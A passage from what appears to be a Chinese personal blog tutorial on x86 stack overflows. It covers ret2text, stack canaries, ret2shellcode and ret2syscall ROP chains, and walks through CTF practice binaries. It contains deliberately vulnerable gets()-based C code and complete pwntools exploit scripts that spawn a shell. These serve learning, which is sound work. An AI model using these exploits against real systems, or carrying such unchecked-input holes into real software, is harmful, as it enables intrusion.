</code></pre><p>这张图可以来说明发生了什么 —— 我们往地址中有意填充了一系列函数的返回地址，程序也就会顺着我们填充的地址来进行跳转。</p><p><img loading="lazy" data-src="stack_corrupt_chains.jpg" alt=""></p><p>这样子，我们构造了一条控制流来影响程序的运行。</p><h2 id="如果有输入的话然后ret2text"><a class="anchor" href="#如果有输入的话然后ret2text">#</a> 如果有输入的话，然后 ret2text</h2><p>这样的话，如果这个程序有输入……</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">void</span> <span class="token function">impossible</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// get shell</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">void</span> <span class="token function">bad_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">char</span> input<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token function">gets</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token function">bad_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><code>gets</code> 函数的一个特点在于，它不会检查读入了多少字符。也就是说，尽管 <code>input</code> 只能放下 16 个 char，gets 也不会在输入了 16 个字符的时候停下来。</p><p>那这样，多余的输入就会冲入栈上的剩余空间。</p><p><img loading="lazy" data-src="gets_stack_overflow.jpg" alt=""></p><p>如果我们去有意构造程序的输入，那我们也就能够去控制程序的运行。通过反编译工具，我们能够看到函数 <code>impossible</code> 的地址：</p><pre><code class="language-x86asm">08049186 &lt;impossible&gt;:
 8049186:       55                      push   ebp
 8049187:       89 e5                   mov    ebp,esp
 ......
</code></pre><p>我们就需要想法设法将 <code>0x08049186</code> 这个地址覆盖到 <code>bad_test</code> 函数的返回地址。来看这个函数的指令：</p><pre><code class="language-x86asm">080491a3 &lt;bad_test&gt;:
 80491a3:       55                      push   ebp
 80491a4:       89 e5                   mov    ebp,esp
 80491a6:       83 ec 18                sub    esp,0x18
 80491a9:       83 ec 0c                sub    esp,0xc
 80491ac:       8d 45 e8                lea    eax,[ebp-0x18]
 80491af:       50                      push   eax
 80491b0:       e8 9b fe ff ff          call   8049050 &lt;gets@plt&gt;
 80491b5:       83 c4 10                add    esp,0x10
 80491b8:       90                      nop
 80491b9:       c9                      leave  
 80491ba:       c3                      ret    
</code></pre><p>在调用 <code>gets</code> 函数之前，程序通过 <code>lea eax, [ebx-0x18]</code> 指令将 <code>[ebx-0x18]</code> 这个地址放入了 <code>eax</code> 寄存器中。接下来， <code>eax</code> 被压入栈中。也就是传递给函数 <code>gets</code> 的参数是 <code>eax</code> 即 <code>[ebx-0x18]</code> 这个地址。这个地址实际上就是字符串读入的位置也就是变量 <code>input</code> 。</p><p>那么如果我们读入 0x18 个字符，便会正好覆盖到 ebx 的位置上方：</p><p><img loading="lazy" data-src="test_gets1.jpg" alt=""></p><p>如果多覆盖一些则会溢出到返回地址中：</p><p><img loading="lazy" data-src="test_gets2.jpg" alt=""></p><p>可以看到程序返回到了我们写上去的地址：</p><pre><code>   0x80491b5 &lt;bad_test+18&gt;    add    esp, 0x10
   0x80491b8 &lt;bad_test+21&gt;    nop    
   0x80491b9 &lt;bad_test+22&gt;    leave  
 ► 0x80491ba &lt;bad_test+23&gt;    ret    &lt;0x37373737&gt; ; 0x37373737=&quot;7777&quot;
</code></pre><p>那么我们只需要去构造一个输入的字符串 <code>&quot;a&quot;*(0x18 + 0x4) + addr(impossible)</code> 就行了：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>target <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./a.out'</span><span class="token punctuation">)</span> <span class="token comment"># 目标</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>target_addr <span class="token operator">=</span> <span class="token number">0x08049186</span></pre></td></tr><tr><td data-num="6"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">28</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>target_addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>target<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment"># 发送 payload</span></pre></td></tr><tr><td data-num="9"></td><td><pre>target<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 开启交互</span></pre></td></tr></table></figure><p>可见我们使得程序跳转到了 <code>impossible</code> 函数并运行了里面的 <code>execve</code> 命令。</p><p><img loading="lazy" data-src="gets_exp.jpg" alt=""></p><p>获取控制权，达成。这个例子实际上控制程序跳转到 <code>.text</code> 段中的已有的代码，这个手段也就是被称为 <code>ret2text</code> 。这种利用 <code>ret</code> 指令的跳转来构造特定控制流的方法叫做 ROP（Return Oriented Programming）。</p><h2 id="事实上安全检查关闭了"><a class="anchor" href="#事实上安全检查关闭了">#</a> 事实上安全检查关闭了</h2><p>前面其实有一个问题并没有说明：在前面的测试中，安全检查是已经被关闭的。</p><p>我们在使用 gcc 编译程序的时候，设置了 <code>-fno-stack-protector</code> 选项，这个操作禁用了栈溢出的防护。在编译时去掉这个选项，执行脚本时程序报错：</p><pre><code>*** stack smashing detected ***: terminated
</code></pre><p>这个安全机制被称为 canary（金丝雀）。过去在矿井中，一些矿工会携带一只金丝雀。因为金丝雀对矿井中的有毒气体非常敏感，当有毒气体浓度增加，金丝雀会中毒而死，而矿工可以得到警告逃离危险区域。</p><p>对于这段程序：</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">void</span> <span class="token function">bad_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">char</span> input<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token function">gets</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>我们来看一下设置了 canary 之后程序的变化：</p><pre><code class="language-x86asm">08049186 &lt;bad_test&gt;:
 8049186:       55                      push   ebp
 8049187:       89 e5                   mov    ebp,esp
    ; 上面两行是正常的函数序言
 8049189:       83 ec 18                sub    esp,0x18
    ; 建立函数的栈帧
 804918c:       65 a1 14 00 00 00       mov    eax,gs:0x14
 8049192:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax
    ; 这两条指令就是设置了canary
    ; 从gs段读取了一个值放入eax，再把这个值写入栈[ebp-0xc]的位置
 8049195:       31 c0                   xor    eax,eax
 8049197:       83 ec 0c                sub    esp,0xc
 804919a:       8d 45 f0                lea    eax,[ebp-0x10]
 804919d:       50                      push   eax
 804919e:       e8 ad fe ff ff          call   8049050 &lt;gets@plt&gt;
 80491a3:       83 c4 10                add    esp,0x10
 80491a6:       90                      nop
    ; 函数实际功能的执行
 80491a7:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
 80491aa:       65 2b 05 14 00 00 00    sub    eax,DWORD PTR gs:0x14
    ; 将现在栈上的canary和来源的地方比较一下
 80491b1:       74 05                   je     80491b8 &lt;bad_test+0x32&gt;
    ; 如果相等就跳转到leave指令
 80491b3:       e8 a8 fe ff ff          call   8049060 &lt;__stack_chk_fail@plt&gt;
    ; 否则执行__stack_chk_fail函数，也就是发现了栈溢出
 80491b8:       c9                      leave  
 80491b9:       c3                      ret   
</code></pre><p>如果程序出现栈溢出的话，在 EBP 和返回地址被覆盖之前，Canary 就已经被改变了，这样程序的控制流就会转入 <code>__stack_chk_fail</code> 中，这个函数会执行错误处理操作并停止程序的继续运行，避免被攻击者利用。</p><p>如果我们用 checksec 之类的工具来查看的话，可以看到程序的各个安全参数：</p><pre><code>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable      FILE
Partial RELRO   Canary found    NX enabled      No PIE          No RPATH   No RUNPATH   83) Symbols       No    0               2               ret2text
</code></pre><h1 id="如果不是ret2text"><a class="anchor" href="#如果不是ret2text">#</a> 如果不是 ret2text</h1><p>在实际的程序里一般是不会像上面那样留一个大大的 <code>execve('/bin/sh')</code> 的后门的。这种程序里没有直接留下可以被调用的代码的情况，可能得需要自己去构造一个后门来插进去。</p><p>一种思路是<strong> ret2shellcode</strong>，也就是控制程序返回到我们设置的 shellcode 中。这个 shellcode 实际上就是我们设置的能够完成一些功能（比如说拿到权限）的一串代码。</p><p>这种思路的实现条件还算是比较苛刻 —— 我们 shellcode 设置的位置需要能够被执行。怎么去理解这个问题呢？</p><p>现在许多系统都有数据执行保护（Data Execution Prevention, DEP），这个保护的作用是防止攻击者修改正在执行的程序指令。内存中的一些区块会有一个 NX 标记（<strong>N</strong>o E<strong>X</strong>ecution），表明这个区块是不可执行的。较多的情况下，一个程序应该满足能够被写入的区块不可被执行，能够被执行的区块不可被写入。</p><p>上面一个程序 checksec 返回的结果就显示 <code>NX enabled</code> ，也就是说像栈这种可以被写入的区块上面的内容不可以被作为指令来执行。</p><p>拿<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">这个</a>程序来说。</p><p>拖进 IDA 反汇编之后得到：</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-64h] BYREF</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No system for you this time !!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 可以溢出</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token function">strncpy</span><span class="token punctuation">(</span>buf2<span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 将栈上临时变量 s 里面的数据复制到 buf2 里面，buf2 在 bss 段</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bye bye ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>通过 checksec 我们会看到程序基本上处于无保护的状态：</p><pre><code>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   79) Symbols       No    0               3               ret2shellcode
</code></pre><p>通过 IDA 查看可以发现变量 <code>buf2</code> 在 <code>.bss</code> 段上：</p><p><img loading="lazy" data-src="ret2shellcode.jpg" alt=""></p><p>通过 gdb 调试之后可以注意到这里是可以被执行的：</p><pre><code>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x8049000 r-xp     1000 0      /home/syml/Temp/ret2shellcode
 0x8049000  0x804a000 r--p     1000 0      /home/syml/Temp/ret2shellcode
 0x804a000  0x804b000 rw-p     1000 1000   /home/syml/Temp/ret2shellcode &lt;==在这里
                       ^ 可以被执行的
</code></pre><p>那么我们可以这样来进行攻击：构造一段可以被执行的 shellcode，通过 <code>gets</code> 函数读入 <code>s</code> 变量中，同时产生一个栈溢出，让 <code>main</code> 函数的返回地址指向.bss 段的 <code>buf2</code> 变量的位置。接下来程序会将 <code>s</code> 的 shellcode 复制到 <code>buf2</code> 中。这样，在 main 函数返回的时候，就会跳转到.bss 段的 <code>buf2</code> 变量位置执行我们的 shellcode。</p><p>我们可以直接使用 pwntools 构造 shellcode：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>接下来就是构造栈溢出：</p><pre><code> 804858c:       8d 44 24 1c             lea    eax,[esp+0x1c]
 8048590:       89 04 24                mov    DWORD PTR [esp],eax
 8048593:       e8 38 fe ff ff          call   80483d0 &lt;gets@plt&gt;
</code></pre><p>通过 objdump 查看 main 函数的汇编可以看到，在执行 <code>gets</code> 函数前被压入栈中的 eax 存放的就是字符串 <code>char s[]</code> 的地址。这个地址是相对于 <code>esp</code> 的偏移，而需要构造 payload 我们要知道相对于 ebp 的偏移。我们可以通过动态调试得到偏移：</p><p><img loading="lazy" data-src="ret2shellcode_offset.jpg" alt=""></p><p>可以看出来， <code>esp</code> 相对于 <code>ebp</code> 的偏移是 <code>0xffffcf58-0xffffced0=0x88</code> ， <code>char s[]</code> 相对于 <code>esp</code> 的偏移是 <code>0x1c</code> ，那么 <code>char s[]</code> 相对于 <code>ebp</code> 的偏移就是 <code>0x88-0x1c=0x6c</code> 。再加上 <code>EBP</code> 占据的 4 个字节，所以返回地址的位置就在偏移 <code>0x70</code> 的位置上。</p><p>另外一种简单的方法是直接使用 pwntools 的功能：通过 <code>pwn cyclic 200</code> 这样的命令生成足够长度的字符串，输入进去之后会出现栈溢出，这个时候去查看 <code>EIP</code> 的值，通过 <code>pwn cyclic -l &lt;pattern&gt;</code> 就可以知道偏移。</p><p>所以说构造的栈溢出的 payload 应该是： <code>shellcode+'A'补全0x70+buf的地址</code> 。</p><p>可以构造 payload：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>target <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2shellcode'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>target_addr <span class="token operator">=</span> <span class="token number">0x0804a080</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>payload <span class="token operator">=</span> shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">,</span> <span class="token string">b'A'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>target_addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>target<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>target<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>ok。拿张图说明一下：</p><p><img loading="lazy" data-src="ret2shellcode_explain.jpg" alt=""></p><h1 id="更进一步ret2syscall"><a class="anchor" href="#更进一步ret2syscall">#</a> 更进一步，ret2syscall</h1><p>前面的 ret2shellcode 有着比较严格的条件，就是要求 NX disabled。如果程序设置了数据执行保护，那么这种方式就无法实现了。</p><p>一个思路是去构造 ROP chain。ROP chain 可以利用程序中间的一系列 ret 指令来实现修改寄存器、进行系统调用等功能。</p><p><img loading="lazy" data-src="ropchain.jpg" alt=""></p><p>如果我们想要进行一个系统调用的话，我们需要给一些寄存器设定好参数。32 位系统调用 execve 的时候，系统调用号 <code>EAX</code> 为 <code>0xb</code> ， <code>EBX</code> 为一个指向 <code>/bin/sh</code> （或者你要调用的命令）的指针， <code>ECX</code> 和 <code>EDX</code> 都是 0，设置好四个寄存器之后，执行指令 <code>int 0x80</code> 就可以进行系统调用了。</p><p>以设置 EAX 为例，我们寻找到一段代码 <code>pop eax; ret</code> 。接下来我们向栈中压入（溢出）三个数据： <code>返回地址</code> ， <code>0xb</code> ，前面代码段的地址。</p><p>这样，我们运行到 <code>ret</code> 语句时，就会跳转到 <code>pop eax; ret</code> ，执行完 <code>pop eax</code> 之后，现在栈顶的 <code>0xb</code> 弹出进入 <code>eax</code> ，接下来再 <code>ret</code> 到我们设置的地址。这样子我们也就完成了一个寄存器的修改。</p><p>以这个<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">程序</a>为例。</p><p>拖进 IDA 进行反编译，看到 <code>main</code> 函数存在栈溢出：</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-64h] BYREF</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This time, no system() and NO SHELLCODE!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What do you plan to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>同时跑一下 checksec：</p><pre><code>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   2255) Symbols     No    0               0               rop
</code></pre><p>程序开启了 NX，那么也就不能 ret2shellcode。</p><pre><code> EBP  0xffffd598 —▸ 0x8049630 (__libc_csu_fini) ◂— push   ebx
 ESP  0xffffd510 —▸ 0xffffd52c ◂— 0x3
</code></pre><p>通过 gdb 调试可以发现，返回地址相对于数组 <code>v4</code> 基址的偏移还是 <code>0xffffd598-0xffffd510-0x1c+0x4=0x70</code> 。</p><p>那么我们就开始构造一个 ROP chain：</p><p>首先需要设置 <code>EAX</code> 的值为 0xb，我们通过 ROP gadget 寻找这样的指令序列：</p><pre><code>$ ROPgadget --binary rop --only 'pop|ret' | grep 'eax'    
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
</code></pre><p>我们选择第二个。</p><p>接下来同样，寻找设置 <code>EBX</code> 的指令序列：</p><pre><code>$ ROPgadget --binary rop --only 'pop|ret' | grep 'ebx'    
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
......
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
......
0x0807b6ed : pop ss ; pop ebx ; ret
</code></pre><p>寻找设置 ECX 的指令序列：</p><pre><code>$ ROPgadget --binary rop --only 'pop|ret' | grep 'ecx' 
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
</code></pre><p>发现第二条指令能够同时设置 <code>EBX,ECX,EDX</code> ，我们就直接选择这一条。</p><p>以及字符串 '/bin/sh'：</p><pre><code>$ ROPgadget --binary rop --string '/bin/sh' 
Strings information
============================================================
0x080be408 : /bin/sh
</code></pre><p>还有 syscall (int 0x80)：</p><pre><code>$ ROPgadget --binary rop --only 'int'  
Gadgets information
============================================================
0x08049421 : int 0x80

Unique gadgets found: 1
</code></pre><p>接下来就是关于指令的顺序：在栈溢出之后 ret，程序会先执行我们设置的地址处的指令 <code>pop eax ; ret</code> ，然后执行 <code>pop edx ; pop ecx ; pop ebx ; ret</code> ，最后执行 <code>int 0x80</code> 。</p><p>栈上应该是这样的布局：</p><pre><code>+----------+
|0x080bb196| =&gt; pop eax ; ret
+----------+
|0x0000000b| =&gt; EAX=0xb
+----------+
|0x0806eb90| =&gt; pop edx ; pop ecx ; pop ebx ; ret 
+----------+
|0x00000000| =&gt; EDX=0x0
+----------+
|0x00000000| =&gt; ECX=0x0
+----------+
|0x080be408| =&gt; EBX=0x080be408 -&gt; '/bin/sh'
+----------+
|0x08049421| =&gt; int 0x80
+----------+
</code></pre><p>这样我们可以编写脚本：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./rop'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>chains <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x80bb196</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x806eb90</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x80be408</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x8049421</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">112</span> <span class="token operator">+</span> chains<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>运行，getshell.</p><p><img loading="lazy" data-src="rop_exp.jpg" alt=""></p><h1 id="参考资料"><a class="anchor" href="#参考资料">#</a> 参考资料</h1><p>[1] <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/</a></p><div class="tags"><a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag"><i class="ic i-tag"></i>栈溢出</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-eye"></i></span><span class="text">总访问量：</span><span class="waline-pageview-count" id="twikoo_visitors" data-path="/2022/03/28/stackoverflow-learn/">加载中...</span></span><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于 </span><time title="修改时间：2025-09-10 14:48:49" itemprop="dateModified" datetime="2025-09-10T14:48:49+08:00">2025-09-10</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>神隐陌路/symlPigeon<i class="ic i-at"><em>@</em></i>symlpigeon's little gensokyo</li><li class="link"><strong>本文链接：</strong><a href="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/" title="关于栈溢出的一些东西（基本的）">http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2022/03/23/mpc-gmw/" rel="prev" itemprop="url" data-background-image="&#x2F;assets&#x2F;bgimgs&#x2F;8f9c6cc1ly8h18c6r31tcj216d0u0qd2.jpg" title="多方安全计算——GMW协议"><span class="type">上一篇</span><span class="category"><i class="ic i-flag"></i>安全计算</span><h3>多方安全计算——GMW协议</h3></a></div><div class="item right"><a href="/2022/03/30/stackoverflow-ret2libc/" rel="next" itemprop="url" data-background-image="&#x2F;assets&#x2F;bgimgs&#x2F;8f9c6cc1ly8h18cffq313j211g0n90xk.jpg" title="栈溢出，ret2libc"><span class="type">下一篇</span><span class="category"><i class="ic i-flag"></i>Pwn</span><h3>栈溢出，ret2libc</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div 